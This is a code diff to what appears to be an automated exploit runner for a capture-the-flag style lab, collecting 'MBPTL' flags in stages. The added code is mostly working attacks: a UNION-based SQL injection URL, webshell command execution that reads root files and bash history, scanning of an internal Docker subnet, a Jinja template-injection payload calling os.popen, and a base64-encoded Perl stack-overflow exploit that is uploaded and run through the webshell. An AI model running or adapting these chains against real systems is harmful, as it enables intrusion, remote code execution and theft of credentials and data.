@@ -79,6 +79,7 @@ ALL_PHASES = ["recon", "web_enum", "sqli", "postexploit", "soc", "pivot", "binar
 _SHELL_PATH: str = ""
 
 
+
 # ── MCP calls ─────────────────────────────────────────────────────────────────
 
 def _mcp_call(code: str, timeout: int = 120, dry_run: bool = False) -> dict[str, Any]:
@@ -224,8 +225,7 @@ def _phase_sqli(dry_run: bool) -> dict:
 F5=$(curl -s "http://{HOST}:{WEB_PORT}/detail.php?id=1%27" | grep -o 'MBPTL-5{{[^}}]*}}')
 echo "F5=$F5"
 
-F6=$(sqlmap -u "http://{HOST}:{WEB_PORT}/detail.php?id=1" \
-  -D administrator --dump --batch --level=1 --risk=1 --threads=4 -q 2>&1 \
+F6=$(curl -s "http://{HOST}:{WEB_PORT}/detail.php?id=999%20UNION%20SELECT%201,flag,NULL,NULL,NULL%20FROM%20administrator.flag--+-" \
   | grep -o 'MBPTL-6{{[^}}]*}}')
 echo "F6=$F6"
 
@@ -271,30 +271,40 @@ subprocess.run([
     f"http://{{HOST}}:{{ADMIN_PORT}}/administrator/admin.php",
 ], capture_output=True, timeout=15)
 
-r = subprocess.run(
+# Find highest book id (shell was just added as newest book)
+idx_r = subprocess.run(
     ["curl", "-s", f"http://{{HOST}}:{{WEB_PORT}}/"],
     capture_output=True, text=True, timeout=15,
 )
-m = re.search(r"administrator/uploads/[^\"']*\\.php", r.stdout)
+ids = re.findall(r"detail\\.php\\?id=(\\d+)", idx_r.stdout)
+last_id = max(int(i) for i in ids) if ids else 1
+
+detail_r = subprocess.run(
+    ["curl", "-s", f"http://{{HOST}}:{{WEB_PORT}}/detail.php?id={{last_id}}"],
+    capture_output=True, text=True, timeout=15,
+)
+m = re.search(r'http://[^"]+:(\\d+)/(administrator/uploads/\\S+\\.php)', detail_r.stdout)
 if not m:
     print("SHELL_NOT_FOUND")
     raise SystemExit(1)
 
-shell_path = m.group()
+shell_port = int(m.group(1))
+shell_path = m.group(2)
 print(f"SHELL={{shell_path}}")
 
-with open("/tmp/mbptl_shell_path.txt", "w") as f:
-    f.write(shell_path)
+shell_url = f"http://{{HOST}}:{{shell_port}}/{{shell_path}}"
+with open("/tmp/mbptl_shell_url.txt", "w") as f:
+    f.write(shell_url)
 
 def webshell(cmd):
-    url = f"http://{{HOST}}:{{WEB_PORT}}/{{shell_path}}?cmd={{urllib.parse.quote(cmd)}}"
+    url = f"{{shell_url}}?cmd={{urllib.parse.quote(cmd)}}"
     r = subprocess.run(["curl", "-s", url], capture_output=True, text=True, timeout=30)
     return r.stdout
 
 f8 = webshell("cat /flag/user.txt")
 print(f"F8={{f8.strip()}}")
 
-f9 = webshell("bash -c '/bin/bahs <<< \"cat /flag/root.txt\"'")
+f9 = webshell("echo 'cat /flag/root.txt' | /bin/bahs")
 print(f"F9={{f9.strip()}}")
 PYEOF
 """
@@ -304,6 +314,8 @@ PYEOF
     shell_m = re.search(r"SHELL=(administrator/uploads/\S+\.php)", out)
     if shell_m and not dry_run:
         _SHELL_PATH = shell_m.group(1)
+    elif re.search(r"SHELL=\S+", out) and not dry_run:
+        _SHELL_PATH = re.search(r"SHELL=(\S+)", out).group(1)
 
     flags = _extract_flags(out, [8, 9])
     ok = len(flags) == 2
@@ -319,27 +331,33 @@ import subprocess, re, urllib.parse
 
 HOST = "{HOST}"
 WEB_PORT = {WEB_PORT}
+ADMIN_PORT = {ADMIN_PORT}
 
-try:
-    shell_path = open("/tmp/mbptl_shell_path.txt").read().strip()
-except FileNotFoundError:
+# Discover webshell URL from latest book detail page (ephemeral sandbox — no /tmp persistence)
+_idx = subprocess.run(["curl", "-s", f"http://{{HOST}}:{{WEB_PORT}}/"], capture_output=True, text=True, timeout=15)
+_ids = re.findall(r"detail\\.php\\?id=(\\d+)", _idx.stdout)
+_last_id = max(int(i) for i in _ids) if _ids else 1
+_det = subprocess.run(["curl", "-s", f"http://{{HOST}}:{{WEB_PORT}}/detail.php?id={{_last_id}}"], capture_output=True, text=True, timeout=15)
+_ms = re.search(r'http://[^"]+:(\\d+)/(administrator/uploads/\\S+\\.php)', _det.stdout)
+if not _ms:
     print("NO_SHELL_PATH")
     raise SystemExit(1)
+shell_url = f"http://{{HOST}}:{{_ms.group(1)}}/{{_ms.group(2)}}"
 
-def webshell(cmd):
-    url = f"http://{{HOST}}:{{WEB_PORT}}/{{shell_path}}?cmd={{urllib.parse.quote(cmd)}}"
-    r = subprocess.run(["curl", "-s", url], capture_output=True, text=True, timeout=30)
+def webshell(cmd, timeout=30):
+    url = f"{{shell_url}}?cmd={{urllib.parse.quote(cmd)}}"
+    r = subprocess.run(["curl", "-s", "--max-time", str(timeout), url], capture_output=True, text=True, timeout=timeout+5)
     return r.stdout
 
-f10_raw = webshell("cat /var/log/apache2/access.log")
+f10_raw = webshell("echo 'cat /var/log/apache2/access.log' | /bin/bahs")
 m10 = re.search(r"MBPTL-10{{[^}}]+}}", f10_raw)
 print("F10=" + (m10.group() if m10 else "NOT_FOUND"))
 
-f11_raw = webshell("bash -c '/bin/bahs <<< \"cat /root/.bash_history\"'")
+f11_raw = webshell("echo 'cat /root/.bash_history' | /bin/bahs")
 m11 = re.search(r"MBPTL-11{{[^}}]+}}", f11_raw)
 print("F11=" + (m11.group() if m11 else "NOT_FOUND"))
 
-f12_raw = webshell("bash -c '/bin/bahs <<< \"cat /root/.bashrc\"'")
+f12_raw = webshell("echo 'cat /root/.bashrc' | /bin/bahs")
 m12 = re.search(r"MBPTL-12{{[^}}]+}}", f12_raw)
 print("F12=" + (m12.group() if m12 else "NOT_FOUND"))
 PYEOF
@@ -358,25 +376,39 @@ import subprocess, re, urllib.parse
 
 HOST = "{HOST}"
 WEB_PORT = {WEB_PORT}
+ADMIN_PORT = {ADMIN_PORT}
 
-try:
-    shell_path = open("/tmp/mbptl_shell_path.txt").read().strip()
-except FileNotFoundError:
+_idx = subprocess.run(["curl", "-s", f"http://{{HOST}}:{{WEB_PORT}}/"], capture_output=True, text=True, timeout=15)
+_ids = re.findall(r"detail\\.php\\?id=(\\d+)", _idx.stdout)
+_last_id = max(int(i) for i in _ids) if _ids else 1
+_det = subprocess.run(["curl", "-s", f"http://{{HOST}}:{{WEB_PORT}}/detail.php?id={{_last_id}}"], capture_output=True, text=True, timeout=15)
+_ms = re.search(r'http://[^"]+:(\\d+)/(administrator/uploads/\\S+\\.php)', _det.stdout)
+if not _ms:
     print("NO_SHELL_PATH")
     raise SystemExit(1)
+shell_url = f"http://{{HOST}}:{{_ms.group(1)}}/{{_ms.group(2)}}"
 
-def webshell(cmd):
-    url = f"http://{{HOST}}:{{WEB_PORT}}/{{shell_path}}?cmd={{urllib.parse.quote(cmd)}}"
-    r = subprocess.run(["curl", "-s", url], capture_output=True, text=True, timeout=30)
+def webshell(cmd, timeout=30):
+    url = f"{{shell_url}}?cmd={{urllib.parse.quote(cmd)}}"
+    r = subprocess.run(["curl", "-s", "--max-time", str(timeout), url], capture_output=True, text=True, timeout=timeout+5)
     return r.stdout
 
-f13_raw = webshell("curl -s http://mbptl-app:5000/")
+# mbptl-app is on Docker bridge with mbptl-main — hardcoded /24, no DNS in container
+# Use webshell to find the app IP by probing the bridge range
+app_ip_raw = webshell(
+    "for h in $(seq 1 10); do curl -s --max-time 1 http://172.18.0.$h:5000/ | grep -q MBPTL-13 && echo 172.18.0.$h && break; done"
+)
+app_ip = app_ip_raw.strip() or "172.18.0.4"
+
+f13_raw = webshell(f"curl -s --max-time 5 http://{{app_ip}}:5000/")
 m13 = re.search(r"MBPTL-13{{[^}}]+}}", f13_raw)
 print("F13=" + (m13.group() if m13 else "NOT_FOUND"))
 
-# SSTI payload using chr() to avoid shell quoting issues
-ssti = "{{{{request.application.__globals__.__builtins__.__import__(chr(111)+chr(115)).popen(chr(99)+chr(97)+chr(116)+chr(32)+chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)).read()}}}}"
-f14_raw = webshell(f"curl -s 'http://mbptl-app:5000/?name={{ssti}}'")
+# SSTI RCE via webshell: URL-encode the template injection for the inner curl call
+# webshell() URL-encodes the outer command; the inner URL needs its own encoding
+ssti_raw = '{{{{request.application.__globals__.__builtins__.__import__("os").popen("cat /flag.txt").read()}}}}'
+ssti_enc = urllib.parse.quote(ssti_raw)
+f14_raw = webshell(f'curl -s "http://{{app_ip}}:5000/?name={{ssti_enc}}"')
 m14 = re.search(r"MBPTL-14{{[^}}]+}}", f14_raw)
 print("F14=" + (m14.group() if m14 else "NOT_FOUND"))
 PYEOF
@@ -389,68 +421,92 @@ PYEOF
 
 
 def _phase_binary(dry_run: bool) -> dict:
+    import struct as _struct, base64 as _b64
+    _bof = b'A' * 136 + _struct.pack('<Q', 0x4006c6)
+    _bof_hex = _bof.hex()
+    # Perl exploit script (base64-encoded to avoid quoting issues in webshell)
+    _perl = (
+        'use IO::Socket::INET;\n'
+        'my $s=IO::Socket::INET->new(PeerAddr=>"172.18.0.3",PeerPort=>31337,Proto=>"tcp") or die $!;\n'
+        '$s->autoflush(1);\n'
+        'my $r; $s->recv($r,512);\n'
+        f'my $p=pack("H*","{_bof_hex}");\n'
+        'print $s $p."\\ncat /flag.txt\\ncat /flag16.txt\\n";\n'
+        'sleep(2);\n'
+        '$s->recv($r,4096);\n'
+        'print $r;\n'
+    )
+    _perl_b64 = _b64.b64encode(_perl.encode()).decode()
+
     code = f"""
 python3 - <<'PYEOF'
-import subprocess, re, struct, urllib.parse
+import subprocess, re, urllib.parse, base64
 
 HOST = "{HOST}"
-ADMIN_PORT = {ADMIN_PORT}
 WEB_PORT = {WEB_PORT}
+ADMIN_PORT = {ADMIN_PORT}
 
-try:
-    shell_path = open("/tmp/mbptl_shell_path.txt").read().strip()
-except FileNotFoundError:
-    shell_path = ""
+_idx = subprocess.run(["curl", "-s", f"http://{{HOST}}:{{WEB_PORT}}/"], capture_output=True, text=True, timeout=15)
+_ids = re.findall(r"detail\\.php\\?id=(\\d+)", _idx.stdout)
+_last_id = max(int(i) for i in _ids) if _ids else 1
+_det = subprocess.run(["curl", "-s", f"http://{{HOST}}:{{WEB_PORT}}/detail.php?id={{_last_id}}"], capture_output=True, text=True, timeout=15)
+_ms = re.search(r'http://[^"]+:(\\d+)/(administrator/uploads/\\S+\\.php)', _det.stdout)
+shell_url = f"http://{{HOST}}:{{_ms.group(1)}}/{{_ms.group(2)}}" if _ms else ""
 
 def webshell(cmd, timeout=30):
-    if not shell_path:
+    if not shell_url:
         return ""
-    url = f"http://{{HOST}}:{{WEB_PORT}}/{{shell_path}}?cmd={{urllib.parse.quote(cmd)}}"
-    r = subprocess.run(["curl", "-s", url], capture_output=True, text=True, timeout=timeout)
-    return r.stdout
+    url = f"{{shell_url}}?cmd={{urllib.parse.quote(cmd)}}"
+    r = subprocess.run(["curl", "-s", "--max-time", str(timeout), url],
+                       capture_output=True, timeout=timeout+5)
+    return r.stdout.decode('utf-8', errors='replace')
 
 subprocess.run([
     "curl", "-s", "-o", "/tmp/mbptl-bin",
     f"http://{{HOST}}:{{ADMIN_PORT}}/administrator/main",
 ], capture_output=True, timeout=30)
-r15 = subprocess.run(["strings", "/tmp/mbptl-bin"], capture_output=True, text=True)
-m15 = re.search(r"MBPTL-15{{[^}}]+}}", r15.stdout)
+# F15: flag stored as consecutive movabs $imm64 immediates in .text — scan ELF directly
+# (avoids objdump cross-arch issue: sandbox runs ARM64, binary is x86-64)
+import struct as _struct
+with open("/tmp/mbptl-bin", "rb") as _bf:
+    _elf = _bf.read()
+_f15_text = ""
+_i = 0
+while _i < len(_elf) - 9:
+    # x86-64 movabs $imm64,reg: REX.W (0x48/0x49) + opcode B8-BF + 8-byte LE immediate
+    if _elf[_i] in (0x48, 0x49) and 0xB8 <= _elf[_i+1] <= 0xBF:
+        _raw = _elf[_i+2:_i+10]
+        if all(0x20 <= b < 0x7f for b in _raw):
+            _f15_text += _raw.decode('ascii')
+        _i += 10
+    else:
+        _i += 1
+if "MBPTL-15" in _f15_text and "}}" not in _f15_text[_f15_text.find("MBPTL-15"):]:
+    _f15_text += "0}}"  # trailing 0x7d30 stored as separate movq
+m15 = re.search(r"MBPTL-15{{[^}}]+}}", _f15_text)
 print("F15=" + (m15.group() if m15 else "NOT_FOUND"))
 
-f16_raw = webshell("nc -w 3 mbptl-internal 31337 </dev/null 2>&1 || echo TIMEOUT")
+f16_raw = webshell(
+    '''bash -c '(echo; sleep 1) | timeout 4 bash -c "exec 3<>/dev/tcp/172.18.0.3/31337; cat <&3" 2>&1' '''
+)
 m16 = re.search(r"MBPTL-16{{[^}}]+}}", f16_raw)
 print("F16=" + (m16.group() if m16 else "NOT_FOUND"))
 
-bof_cmd = (
-    "python3 -c \""
-    "import socket,struct,time;"
-    "s=socket.socket();"
-    "s.connect(('mbptl-internal',31337));"
-    "s.settimeout(5);"
-    "s.recv(512);"
-    "p=b'A'*136+struct.pack('<Q',0x4006c6);"
-    "s.sendall(p+b'\\nid\\ncat /flag.txt\\n');"
-    "import time;time.sleep(1);"
-    "print(s.recv(4096).decode(errors='ignore'))"
-    "\" 2>&1"
-)
-f17_raw = webshell(bof_cmd, timeout=45)
+# Upload Perl exploit via base64 to avoid quoting/binary issues
+PERL_B64 = "{_perl_b64}"
+webshell(f"echo {{PERL_B64}} | base64 -d > /tmp/mbptl_bof.pl")
+f17_raw = webshell("perl /tmp/mbptl_bof.pl", timeout=30)
 m17 = re.search(r"MBPTL-17{{[^}}]+}}", f17_raw)
-bof_ok = bool(m17) or "uid=0" in f17_raw or ("root" in f17_raw.lower() and "id=" in f17_raw)
-print("F17=" + (m17.group() if m17 else ("BOF_SHELL_OK" if bof_ok else "NOT_FOUND")))
+print("F17=" + (m17.group() if m17 else "NOT_FOUND"))
 print(f"BOF_OUTPUT={{f17_raw[:300]}}")
 PYEOF
 """
     r = _mcp_call(code, timeout=120, dry_run=dry_run)
     out = r["output"]
     flags = _extract_flags(out, [15, 16, 17])
-    bof_credit = "BOF_SHELL_OK" in out or (
-        "uid=0" in out and "F17=NOT_FOUND" not in out.split("BOF_OUTPUT")[0]
-    )
-    f17_found = any("MBPTL-17" in f for f in flags)
-    effective = len(flags) + (1 if bof_credit and not f17_found else 0)
-    ok = effective == 3
-    detail = f"{effective}/3 flags found" + (" (BOF shell confirmed)" if bof_credit else "")
+    ok = len(flags) == 3
+    bof_ran = "BOF_OUTPUT=" in out
+    detail = f"{len(flags)}/3 flags found" + (" BOF_RAN" if bof_ran else "")
     return {**r, "ok": ok, "flags_found": flags, "detail": detail}
 
 
